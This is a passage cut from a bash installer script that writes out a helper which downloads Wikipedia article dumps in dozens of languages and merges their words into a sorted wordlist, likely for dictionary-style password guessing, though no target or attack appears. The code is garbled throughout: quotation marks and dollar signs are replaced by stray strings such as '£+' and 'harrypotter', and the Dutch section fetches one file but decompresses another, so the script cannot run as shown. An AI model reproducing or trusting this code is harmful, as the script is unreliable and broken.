ln -sf /opt/darkeffe/videoaudioconv.sh /usr/local/bin/videoaudioconv 1> /dev/null

cd $HOME

}

f_videoaudioconverter

f_wiki () {

echo "  [*] Wiki"

cd /opt 1> /dev/null
mkdir -p darkeffe 1> /dev/null
cd darkeffe 1> /dev/null

rm -f wiki.sh 1> /dev/null
touch wiki.sh 1> /dev/null

f_writing_wiki () {

echo "#!/bin/bash

clear

# This Script Download All The Major Wikies In Various Languages
# And Merge Them All To A Wordlist (wikipedia.txt)

f_working () {

echo
echo £+##############################£+
echo

echo £+[*] Cating, Seding and Sorting ...£+

n=1

FILE=£+/tmp/count.txt£+
ls x* > harrypotterFILE

t=harrypotter(grep [^*harrypotter] harrypotterFILE -c)

for i in x*; do
	if [ -e £+harrypotteri£+ ]; then
		file=harrypotter( basename £+harrypotteri£+ )
		echo harrypottern / harrypottert
		cat £+harrypotteri£+ | sed -e 's/[^a-zA-Z]/ /g' | sed -e 's/[:print:]^//g' | sed -e 's/[:cntrl:]*//g' | sed -e '/aaa/d' | sed -e '/bbb/d' | sed -e '/ccc/d' | sed -e '/ddd/d' | sed -e '/eee/d' | sed -e '/fff/d' | sed -e '/ggg/d' | sed -e '/hhh/d' | sed -e '/iii/d' | sed -e '/jjj/d' | sed -e '/kkk/d' | sed -e '/lll/d' | sed -e '/mmm/d' | sed -e '/nnn/d' | sed -e '/ooo/d' | sed -e '/ppp/d' | sed -e '/qqq/d' | sed -e '/rrr/d' | sed -e '/sss/d' | sed -e '/ttt/d' | sed -e '/uuu/d' | sed -e '/vvv/d' | sed -e '/www/d' | sed -e '/xxx/d' | sed -e '/yyy/d' | sed -e '/zzz/d' | sed -e '/ààà/d' | sed -e '/èèè/d' | sed -e '/ììì/d' | sed -e '/òòò/d' | sed -e '/ùùù/d' | sed -e '/£££/d' | sed -e '/&&&/d' | sed -e '/ççç/d' | sed -e '/§§§/d' | sed -e '/harrypotterharrypotterharrypotter/d' | tr ' ' '\012' | tr '[:upper:]' '[:lower:]' | sed -e '/^harrypotter/d' | sort -u >> £+harrypotterfile.txt£+ 2> /dev/null
	    n=harrypotter[ harrypottern + 1 ]
	fi
done

echo
echo £+##############################£+
echo

clear

}

# Afrikaans (af)
f_af () {

axel http://dumps.wikimedia.org/afwiki/latest/afwiki-latest-pages-articles.xml.bz2
bzip2 -d -c afwiki-latest-pages-articles.xml.bz2 >> afwiki.xml
rm -f afwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=50000 afwiki.xml
rm -f afwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> afwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Albanian (sq)
f_sq () {

axel http://dumps.wikimedia.org/sqwiki/latest/sqwiki-latest-pages-articles.xml.bz2
bzip2 -d -c sqwiki-latest-pages-articles.xml.bz2 >> sqwiki.xml
rm -f sqwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 sqwiki.xml
rm -f sqwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> sqwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Arabic (ar)
f_ar () {

axel http://dumps.wikimedia.org/arwiki/latest/arwiki-latest-pages-articles.xml.bz2
bzip2 -d -c arwiki-latest-pages-articles.xml.bz2 >> arwiki.xml
rm -f arwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 arwiki.xml
rm -f arwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> arwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Armenian (hy)
f_hy () {

axel http://dumps.wikimedia.org/hywiki/latest/hywiki-latest-pages-articles.xml.bz2
bzip2 -d -c hywiki-latest-pages-articles.xml.bz2 >> hywiki.xml
rm -f hywiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 hywiki.xml
rm -f hywiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> hywiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Azerbaijani (az)
f_az () {

axel http://dumps.wikimedia.org/azwiki/latest/azwiki-latest-pages-articles.xml.bz2
bzip2 -d -c azwiki-latest-pages-articles.xml.bz2 >> azwiki.xml
rm -f azwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 azwiki.xml
rm -f azwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> azwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Basque (eu)
f_eu () {

axel http://dumps.wikimedia.org/euwiki/latest/euwiki-latest-pages-articles.xml.bz2
bzip2 -d -c euwiki-latest-pages-articles.xml.bz2 >> euwiki.xml
rm -f euwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 euwiki.xml
rm -f euwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> euwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Belarusian (be)
f_be () {

axel http://dumps.wikimedia.org/bewiki/latest/bewiki-latest-pages-articles.xml.bz2
bzip2 -d -c bewiki-latest-pages-articles.xml.bz2 >> bewiki.xml
rm -f bewiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 bewiki.xml
rm -f bewiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> bewiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Bulgarian (bg)
f_bg () {

axel http://dumps.wikimedia.org/bgwiki/latest/bgwiki-latest-pages-articles.xml.bz2
bzip2 -d -c bgwiki-latest-pages-articles.xml.bz2 >> bgwiki.xml
rm -f bgwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 bgwiki.xml
rm -f bgwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> bgwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Catalan (ca)
f_ca () {

axel http://dumps.wikimedia.org/cawiki/latest/cawiki-latest-pages-articles.xml.bz2
bzip2 -d -c cawiki-latest-pages-articles.xml.bz2 >> cawiki.xml
rm -f cawiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 cawiki.xml
rm -f cawiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> cawiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Chinese (zh)
f_zh () {

axel http://dumps.wikimedia.org/zhwiki/latest/zhwiki-latest-pages-articles.xml.bz2
bzip2 -d -c zhwiki-latest-pages-articles.xml.bz2 >> zhwiki.xml
rm -f zhwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 zhwiki.xml
rm -f zhwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> zhwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Croatian (hr)
f_hr () {

axel http://dumps.wikimedia.org/hrwiki/latest/hrwiki-latest-pages-articles.xml.bz2
bzip2 -d -c hrwiki-latest-pages-articles.xml.bz2 >> hrwiki.xml
rm -f hrwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 hrwiki.xml
rm -f hrwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> hrwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Czech (cs)
f_cs () {

axel http://dumps.wikimedia.org/cswiki/latest/cswiki-latest-pages-articles.xml.bz2
bzip2 -d -c cswiki-latest-pages-articles.xml.bz2 >> cswiki.xml
rm -f cswiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 cswiki.xml
rm -f cswiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> cswiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Danish (da)
f_da () {

axel http://dumps.wikimedia.org/dawiki/latest/dawiki-latest-pages-articles.xml.bz2
bzip2 -d -c dawiki-latest-pages-articles.xml.bz2 >> dawiki.xml
rm -f dawiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 dawiki.xml
rm -f dawiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> dawiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Deutch (de)
f_de () {

axel http://dumps.wikimedia.org/dewiki/latest/dewiki-latest-pages-articles.xml.bz2
bzip2 -d -c dewiki-latest-pages-articles.xml.bz2 >> dewiki.xml
rm -f dewiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 dewiki.xml
rm -f dewiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> dewiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Emilian-Romagnol (eml)
f_eml () {

axel http://dumps.wikimedia.org/emlwiki/latest/emlwiki-latest-pages-articles.xml.bz2
bzip2 -d -c emlwiki-latest-pages-articles.xml.bz2 >> emlwiki.xml
rm -f emlwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=50000 emlwiki.xml
rm -f emlwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> emlwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# English (en)
f_en () {

axel http://dumps.wikimedia.org/enwiki/latest/enwiki-latest-pages-articles.xml.bz2
bzip2 -d -c enwiki-latest-pages-articles.xml.bz2 >> enwiki.xml
rm -f enwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=10000000 enwiki.xml
rm -f enwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> enwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Espanol (es)
f_es () {

axel http://dumps.wikimedia.org/eswiki/latest/eswiki-latest-pages-articles.xml.bz2
bzip2 -d -c eswiki-latest-pages-articles.xml.bz2 >> eswiki.xml
rm -f eswiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 eswiki.xml
rm -f eswiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> eswiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Esperanto (eo)
f_eo () {

axel http://dumps.wikimedia.org/eowiki/latest/eowiki-latest-pages-articles.xml.bz2
bzip2 -d -c eowiki-latest-pages-articles.xml.bz2 >> eowiki.xml
rm -f eowiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 eowiki.xml
rm -f eowiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> eowiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Estonian (et)
f_et () {

axel http://dumps.wikimedia.org/etwiki/latest/etwiki-latest-pages-articles.xml.bz2
bzip2 -d -c etwiki-latest-pages-articles.xml.bz2 >> etwiki.xml
rm -f etwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=5000000 etwiki.xml
rm -f etwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> etwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# French (fr)
f_fr () {

axel http://dumps.wikimedia.org/frwiki/latest/frwiki-latest-pages-articles.xml.bz2
bzip2 -d -c frwiki-latest-pages-articles.xml.bz2 >> frwiki.xml
rm -f frwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=5000000 frwiki.xml
rm -f frwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> frwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Galician (gl)
f_gl () {

axel http://dumps.wikimedia.org/glwiki/latest/glwiki-latest-pages-articles.xml.bz2
bzip2 -d -c glwiki-latest-pages-articles.xml.bz2 >> glwiki.xml
rm -f glwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 glwiki.xml
rm -f glwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> glwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Gothic (got)
f_got () {

axel http://dumps.wikimedia.org/gotwiki/latest/gotwiki-latest-pages-articles.xml.bz2
bzip2 -d -c gotwiki-latest-pages-articles.xml.bz2 >> gotwiki.xml
rm -f gotwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 gotwiki.xml
rm -f gotwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> gotwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Greek (el)
f_el () {

axel http://dumps.wikimedia.org/elwiki/latest/elwiki-latest-pages-articles.xml.bz2
bzip2 -d -c elwiki-latest-pages-articles.xml.bz2 >> elwiki.xml
rm -f elwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 elwiki.xml
rm -f elwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> elwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Hebrew (he)
f_he () {

axel http://dumps.wikimedia.org/hewiki/latest/hewiki-latest-pages-articles.xml.bz2
bzip2 -d -c hewiki-latest-pages-articles.xml.bz2 >> hewiki.xml
rm -f hewiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 hewiki.xml
rm -f hewiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> hewiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Hungarian (hu)
f_hu () {

axel http://dumps.wikimedia.org/huwiki/latest/huwiki-latest-pages-articles.xml.bz2
bzip2 -d -c huwiki-latest-pages-articles.xml.bz2 >> huwiki.xml
rm -f huwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 huwiki.xml
rm -f huwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> huwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Irish (ga)
f_ga () {

axel http://dumps.wikimedia.org/gawiki/latest/gawiki-latest-pages-articles.xml.bz2
bzip2 -d -c gawiki-latest-pages-articles.xml.bz2 >> gawiki.xml
rm -f gawiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 gawiki.xml
rm -f gawiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> gawiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Italian (it)
f_it () {

axel http://dumps.wikimedia.org/itwiki/latest/itwiki-latest-pages-articles.xml.bz2
bzip2 -d -c itwiki-latest-pages-articles.xml.bz2 >> itwiki.xml
rm -f itwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 itwiki.xml
rm -f itwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> itwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Japanese (ja)
f_ja () {

axel http://dumps.wikimedia.org/jawiki/latest/jawiki-latest-pages-articles.xml.bz2
bzip2 -d -c jawiki-latest-pages-articles.xml.bz2 >> jawiki.xml
rm -f jawiki-latest-pages-articles.xml.bz2

echo £+[*] Sjaiting ...£+
split --lines=5000000 jawiki.xml
rm -f jawiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> jawiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Korean (ko)
f_ko () {

axel http://dumps.wikimedia.org/kowiki/latest/kowiki-latest-pages-articles.xml.bz2
bzip2 -d -c kowiki-latest-pages-articles.xml.bz2 >> kowiki.xml
rm -f kowiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 kowiki.xml
rm -f kowiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> kowiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Latin (la)
f_la () {

axel http://dumps.wikimedia.org/lawiki/latest/lawiki-latest-pages-articles.xml.bz2
bzip2 -d -c lawiki-latest-pages-articles.xml.bz2 >> lawiki.xml
rm -f lawiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=50000 lawiki.xml
rm -f lawiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> lawiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Ligurian (lij)
f_lij () {

axel http://dumps.wikimedia.org/lijwiki/latest/lijwiki-latest-pages-articles.xml.bz2
bzip2 -d -c lijwiki-latest-pages-articles.xml.bz2 >> lijwiki.xml
rm -f lijwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=50000 lijwiki.xml
rm -f lijwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> lijwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Indonesian (id)
f_id () {

axel http://dumps.wikimedia.org/idwiki/latest/idwiki-latest-pages-articles.xml.bz2
bzip2 -d -c idwiki-latest-pages-articles.xml.bz2 >> idwiki.xml
rm -f idwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 idwiki.xml
rm -f idwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> idwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Lithuanian (lt)
f_lt () {

axel http://dumps.wikimedia.org/ltwiki/latest/ltwiki-latest-pages-articles.xml.bz2
bzip2 -d -c ltwiki-latest-pages-articles.xml.bz2 >> ltwiki.xml
rm -f ltwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 ltwiki.xml
rm -f ltwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> ltwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Luxembourgish (lb)
f_lb () {

axel http://dumps.wikimedia.org/lbwiki/latest/lbwiki-latest-pages-articles.xml.bz2
bzip2 -d -c lbwiki-latest-pages-articles.xml.bz2 >> lbwiki.xml
rm -f lbwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 lbwiki.xml
rm -f lbwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> lbwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Malay (ms)
f_ms () {

axel http://dumps.wikimedia.org/mswiki/latest/mswiki-latest-pages-articles.xml.bz2
bzip2 -d -c mswiki-latest-pages-articles.xml.bz2 >> mswiki.xml
rm -f mswiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 mswiki.xml
rm -f mswiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> mswiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Neapolitan (nap)
f_nap () {

axel http://dumps.wikimedia.org/napwiki/latest/napwiki-latest-pages-articles.xml.bz2
bzip2 -d -c napwiki-latest-pages-articles.xml.bz2 >> napwiki.xml
rm -f napwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 napwiki.xml
rm -f napwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> napwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Nederland (nr)
f_nr () {

axel http://dumps.wikimedia.org/nlwiki/latest/nlwiki-latest-pages-articles.xml.bz2
bzip2 -d -c nrwiki-latest-pages-articles.xml.bz2 >> nrwiki.xml
rm -f nrwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 nrwiki.xml
rm -f nrwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> nrwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Norwegian (Bokmål) (no)
f_no () {

axel http://dumps.wikimedia.org/nowiki/latest/nowiki-latest-pages-articles.xml.bz2
bzip2 -d -c nowiki-latest-pages-articles.xml.bz2 >> nowiki.xml
rm -f nowiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 nowiki.xml
rm -f nowiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> nowiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Persian (fa)
f_fa () {

axel http://dumps.wikimedia.org/fawiki/latest/fawiki-latest-pages-articles.xml.bz2
bzip2 -d -c fawiki-latest-pages-articles.xml.bz2 >> fawiki.xml
rm -f fawiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 fawiki.xml
rm -f fawiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> fawiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Piedmontese (pms)
f_pms () {

axel http://dumps.wikimedia.org/pmswiki/latest/pmswiki-latest-pages-articles.xml.bz2
bzip2 -d -c pmswiki-latest-pages-articles.xml.bz2 >> pmswiki.xml
rm -f pmswiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=50000 pmswiki.xml
rm -f pmswiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> pmswiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Polski (pl)
f_pl () {

axel http://dumps.wikimedia.org/plwiki/latest/plwiki-latest-pages-articles.xml.bz2
bzip2 -d -c plwiki-latest-pages-articles.xml.bz2 >> plwiki.xml
rm -f plwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 plwiki.xml
rm -f plwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> plwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Portuguese (pt)
f_pt () {

axel http://dumps.wikimedia.org/ptwiki/latest/ptwiki-latest-pages-articles.xml.bz2
bzip2 -d -c ptwiki-latest-pages-articles.xml.bz2 >> ptwiki.xml
rm -f ptwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 ptwiki.xml
rm -f ptwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> ptwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Romanian (ro)
f_ro () {

axel http://dumps.wikimedia.org/rowiki/latest/rowiki-latest-pages-articles.xml.bz2
bzip2 -d -c rowiki-latest-pages-articles.xml.bz2 >> rowiki.xml
rm -f rowiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 rowiki.xml
rm -f rowiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> rowiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Russian (ru)
f_ru () {

axel http://dumps.wikimedia.org/ruwiki/latest/ruwiki-latest-pages-articles.xml.bz2
bzip2 -d -c ruwiki-latest-pages-articles.xml.bz2 >> ruwiki.xml
rm -f ruwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 ruwiki.xml
rm -f ruwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> ruwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Scottish Gaelic (gd)
f_gd () {

axel http://dumps.wikimedia.org/gdwiki/latest/gdwiki-latest-pages-articles.xml.bz2
bzip2 -d -c gdwiki-latest-pages-articles.xml.bz2 >> gdwiki.xml
rm -f gdwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=50000 gdwiki.xml
rm -f gdwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> gdwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Serbian (sr)
f_sr () {

